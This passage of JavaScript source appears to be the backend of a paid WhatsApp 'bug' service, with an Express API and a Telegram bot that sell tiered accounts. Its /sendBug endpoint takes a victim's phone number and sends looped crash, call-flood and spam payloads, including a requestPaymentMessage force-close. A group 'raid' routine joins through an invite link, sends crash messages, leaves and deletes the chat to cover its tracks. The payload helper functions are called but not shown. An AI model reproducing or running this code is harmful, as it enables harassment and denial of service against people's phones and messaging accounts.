      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.relayMessage(groupJid, {
                 requestPaymentMessage: {
                   currencyCodeIso4217: 'IDR',
                   requestFrom: sock.user.id, 
                   expiryTimestamp: null
                 }
               }, 
               {}
             )
        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});
app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, "");
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false });
  }
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false });
  }

  const roleCooldowns = {
    member: 60,
    reseller: 60,
    reseller1: 60,
    owner: 0,
    vip: 60,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  setImmediate(async () => {
    const isMessBug = false;
    const attemptSend = async (sock, retry = false) => {
      try {
        const targetJid = target + "@s.whatsapp.net";
        switch (bug) {
          case "blank":
            for (let i = 0; i < 5; i++) {
              await blankIos(sock, targetJid);
              await sleep(3000);
            }
            break;
          case "delay":
            for (let i = 0; i < 200; i++) {
              await invisibleSpam(sock, targetJid);
              await sleep(15000);
            }
            break;
          case "call":
            for (let i = 0; i < 100; i++) {
              await PlainCall(sock, targetJid);
              await sleep(3000);
            }
            break;
          case "andro":
             await execute(sock, targetJid);
            break;
          case "ios":
            for (let i = 0; i < 15; i++) {
              await docIos(sock, targetJid);
              await rpnm(sock, targetJid);
              await sleep(3000);
            }
            break;
          case "tes":
            for (let i = 0; i < 150; i++) {
              await DelayCarousel(sock, targetJid);
              await sleep(5000);
            }
            break;
          case "fc":
            for (let i = 0; i < 1; i++) {
              await sock.relayMessage(targetJid, {
                 requestPaymentMessage: {
                   currencyCodeIso4217: 'IDR',
                   requestFrom: targetJid, 
                   expiryTimestamp: null
                 }
               }, 
               { participant: { jid: targetJid } }
             )
            }
            break;
          case "clear":
            const b = await sock.sendMessage(targetJid, { 
                text: "p" 
             });
            console.log(b.message);
          break;
        }
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
        }
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        return false;
      }
    };

    const sock = await checkActiveSessionInFolder(user.username);
    if (!sock) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
      return;
    }

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('session', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)
  return res.json({
    valid: true,
    connections: conns
  });
});

let usePairingCode = true;

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false });
  }
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
    const sessionDir = path.join('session', user.username, number);

    if (!fs.existsSync(`session/${user.username}`)) fs.mkdirSync(`session/${user.username}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      printQRInTerminal: !usePairingCode,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      patchMessageBeforeSending: (message) => {
        const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
        if (requiresPatch) {
          message = {
            viewOnceMessage: {
              message: {
                messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
                ...message
              }
            }
          };
        }
        return message;
      },
      version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      logger: pino({ level: 'fatal' }),
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
      }
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          console.log(`🔄 Reconnecting ${number}...`);
          await waiting(3000);
          await pairingWa(number, user.username);
        } else {
          delete activeConnections[number];
        }
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(number);
      console.log(code)
      if (code) {
        return res.json({ valid: true, number, pairingCode: code });
      } else {
        return res.json({ valid: false, message: "Already registered or failed to get code" });
      }
    }
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }
  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  if (!creator || !["reseller", "owner"].includes(creator.role)) {
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }
  if (db.find(u => u.username === newUser)) {
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabase(db);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync(LOG_FILE, logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }
  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || admin.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || creator.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
  }

  if (db.find(u => u.username === username)) {
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);
  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  if (editor.role === "reseller" && targetUser.role !== "member") {
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync(LOG_FILE, "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const activeConnections = {};
const biz = {};
const mess = {};

function prepareAuthFolders() {
  const userId = "session";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Buat Folder 'session' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        printQRInTerminal: !usePairingCode,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        generateHighQualityLinkPreview: true,
        patchMessageBeforeSending: (message) => {
          const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
          if (requiresPatch) {
            message = {
              viewOnceMessage: {
                message: {
                  messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
                  ...message
                }
              }
            };
          }
          return message;
        },
        version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        logger: pino({ level: 'fatal' }),
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
        }
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "session";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('session', owner, number);

  if (!fs.existsSync('session')) fs.mkdirSync('session');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    printQRInTerminal: !usePairingCode,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    keepAliveIntervalMs: 10000,
    generateHighQualityLinkPreview: true,
    patchMessageBeforeSending: (message) => {
      const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
      if (requiresPatch) {
        message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
              ...message
            }
          }
        };
      }
      return message;
    },
    version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    logger: pino({ level: 'fatal' }),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
    }
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('session', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const subfolders = fs.readdirSync('session')
    .map(name => path.join('session', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside session`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('session', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

async function handleUserManagement(msg, input, type, action) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (type === 'owner' && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ Only developer can manage owners!");
  }
  
  if (type === 'reseller' && !isOwner(userId) && !isAdmin(userId) && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ No permission to manage resellers!");
  }
  
  let targetUser;
  let fullName = '';
  
  if (msg.reply_to_message) {
    targetUser = msg.reply_to_message.from.id;
    fullName = [msg.reply_to_message.from.first_name, msg.reply_to_message.from.last_name].filter(Boolean).join(' ');
  } else if (input?.startsWith('@')) {
    try {
      const member = await bot.getChatMember(chatId, input);
      targetUser = member.user.id;
      fullName = [member.user.first_name, member.user.last_name].filter(Boolean).join(' ');
    } catch {
      return bot.sendMessage(chatId, "❌ Invalid username!");
    }
  } else if (input && !isNaN(input)) {
    targetUser = Number(input);
    try {
      const member = await bot.getChatMember(chatId, targetUser);
      fullName = [member.user.first_name, member.user.last_name].filter(Boolean).join(' ');
    } catch {
      fullName = targetUser.toString();
    }
  } else {
    return bot.sendMessage(chatId, "❌ Please reply to a user or provide user ID/username!");
  }
  
  if (!fullName) fullName = targetUser.toString();
  
  const data = loadAdmins();
  const key = type === 'owner' ? 'owners' : 'resellers';
  
  data[key] = data[key].map(id => Number(id));
  
  const isAdd = action.toLowerCase() === 'add';
  const exists = data[key].includes(targetUser);
  
  if ((isAdd && exists) || (!isAdd && !exists)) {
    const actionText = isAdd ? 'already exists' : 'not found';
    return bot.sendMessage(chatId, `❌ User ${actionText} as ${type}!`);
  }
  
  if (isAdd) {
    data[key].push(targetUser);
  } else {
    data[key] = data[key].filter(id => id !== targetUser);
  }
  
  saveAdmins(data);
  
  const actionText = isAdd ? 'added' : 'removed';
  bot.sendMessage(chatId, 
    `✅ User [${fullName}](tg://user?id=${targetUser}) successfully ${actionText} as ${type.toUpperCase()}!`,
    { 
      parse_mode: 'Markdown',
      reply_to_message_id: msg.message_id 
    }
  );
}

bot.onText(/^\/(add|del)(owner|reseller)\s*(.*)/i, async (msg, match) => {
  const action = match[1];
  const type = match[2];
  const input = match[3];
  await handleUserManagement(msg, input, type, action);
});
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userStatus = getUserStatus(userId);
  const fullName = `${msg.from.first_name || ''} ${msg.from.last_name || ''}`.trim();
  const username = msg.from.username || fullName;
  
  let menuText = `<blockquote><b>
━━━━━━━━━━━━━━━━━━━━━━━━━
▢ USER : @${username}
▢ ID : <code>${userId}</code>
▢ STATUS : ${userStatus}
━━━━━━━━━━━━━━━━━━━━━━━━━`;
  if (hasAccess(userId)) {
    menuText += `
~ ▢ /status
~ ▢ /adduser [username,expired]
~ ▢ /listuser
~ ▢ /addreseller | /delreseller
~ ▢ /addowner | /delowner
━━━━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>`;
  }  
  const opts = {
    caption: menuText,
    reply_to_message_id: msg.message_id,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
         [{ text: 'Developer', url: `https://t.me/primroseell` }]
      ]
    }
  };
  
  await bot.sendAnimation(chatId, 'https://files.catbox.moe/xhjb2x.mp4', opts);
});
bot.onText(/^\/adduser (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userStatus = getUserStatus(userId);
  const input = match[1].split(",");
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }
  if (msg.chat.type !== 'private') return;
  if (input.length < 2) {
    return bot.sendMessage(chatId, "Format: /adduser username,expiry\nExample: /adduser john,30", { parse_mode: "Markdown" });
  }  
  const [username, expiry] = input.map(item => item.trim());
  const password = username + Math.floor(Math.random() * 1000);
  const users = loadDatabase();
  const expiryDays = parseInt(expiry); 
  if (isNaN(expiryDays)) {
    return bot.sendMessage(chatId, "❌ Expiry must be a number!");
  }  
  if (users.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
  let inlineKeyboard = { inline_keyboard: [] }; 
  if (isDeveloper(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Member', callback_data: `adduser_${username}_member_${expiry}_${password}` }],
      [{ text: 'Reseller', callback_data: `adduser_${username}_reseller_${expiry}_${password}` }],
      [{ text: 'Owner', callback_data: `adduser_${username}_owner_${expiry}_${password}` }]
    ];
  }
  else if (isOwner(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Member', callback_data: `adduser_${username}_member_${expiry}_${password}` }],
      [{ text: 'Reseller', callback_data: `adduser_${username}_reseller_${expiry}_${password}` }]
    ];
  }
  else if (isReseller(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Member', callback_data: `adduser_${username}_member_${expiry}_${password}` }]
    ];
  }
 
  if (inlineKeyboard.inline_keyboard.length > 0) {
    return bot.sendMessage(
      chatId,
      `Select role for user *${username}*:\nExpiry: ${expiryDays} days\nPassword will be auto-generated.`,
      { parse_mode: "Markdown", reply_markup: inlineKeyboard }
    );
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  const userId = query.from.id;
  
  if (data.startsWith("adduser_")) {
    const parts = data.replace("adduser_", "").split("_");
    if (parts.length < 4) return;
    
    const [username, role, expiry, password] = parts;
    
    if (role === 'owner' && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "Only developer can create owner!" });
    }
    
    if (role === 'reseller' && !isAdmin(userId) && !isOwner(userId) && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to create resellers!" });
    }
    
    if (role === 'member' && !hasAccess(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to create users!" });
    }    
    const users = loadDatabase();
    const expiryDays = parseInt(expiry);
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + expiryDays);    
    if (users.find(u => u.username === username)) {
      return bot.answerCallbackQuery(query.id, { text: "Username already exists!" });
    }    
    users.push({ username, password, role, expiredDate: expiryDate.toISOString().split("T")[0] });  
    const x = saveDatabase(users);
      bot.editMessageText(
        `User *${username}* successfully added!\n` +
        `Password: \`${password}\`\n` +
        `Role: ${role}\n` +
        `Expired: ${expiryDate.toISOString().split('T')[0]}`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
      bot.answerCallbackQuery(query.id, { text: `User ${username} created as ${role}!` });
  }
  
  if (data.startsWith("view_")) {
    const username = data.replace("view_", "");
    const users = loadDatabase();
    const user = users.find(u => u.username === username);
    
    if (!user) {
      return bot.answerCallbackQuery(query.id, { text: "User not found!" });
    }
    
    const viewerRole = getUserStatus(userId);
    const targetRole = user.role;
    if (viewerRole === 'No Access') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    if (viewerRole === 'reseller' && targetRole !== 'member') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }    
    
    if (viewerRole === 'owner' && targetRole === 'owner') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    
    const maskedPassword = "*".repeat(user.password.length);
    
    let buttons = [];
    const canDelete = checkDeletePermission(userId, user);
    if (canDelete) {
      buttons.push([{ text: "🗑 Delete User", callback_data: `delete_${user.username}` }]);
    }
    
    buttons.push([{ text: "🔙 Back", callback_data: "back_list" }]);
    
    bot.editMessageText(
      `👤 *User Details*\n` +
      `• Username: *${user.username}*\n` +
      `• Password: \`${maskedPassword}\`\n` +
      `• Role: *${user.role}*\n` +
      `• Expired: *${user.expiredDate}*`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: buttons }
      }
    );
  }

  if (data.startsWith("delete_")) {
    const username = data.replace("delete_", "");
    const userId = query.from.id;
    
    const users = loadDatabase();
    const userToDelete = users.find(u => u.username === username);
    
    if (!userToDelete) {
      return bot.answerCallbackQuery(query.id, { text: "User not found!" });
    }
    const canDelete = checkDeletePermission(userId, userToDelete);
    if (!canDelete) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to delete this user!" });
    }
    const updatedUsers = users.filter(u => u.username !== username);
    if (saveDatabase(updatedUsers)) {
      bot.answerCallbackQuery(query.id, { text: `User ${username} deleted!` });
    }
    
    const filteredUsers = updatedUsers.filter(u => {
      const viewerRole = getUserStatus(userId);
      const targetRole = u.role;
      if (viewerRole === 'reseller' && targetRole !== 'member') return false;
      if (viewerRole === 'owner' && targetRole === 'owner') return false;      
      return true;
    });
    
    const buttons = filteredUsers.map(u => [
      { text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }
    ]);    
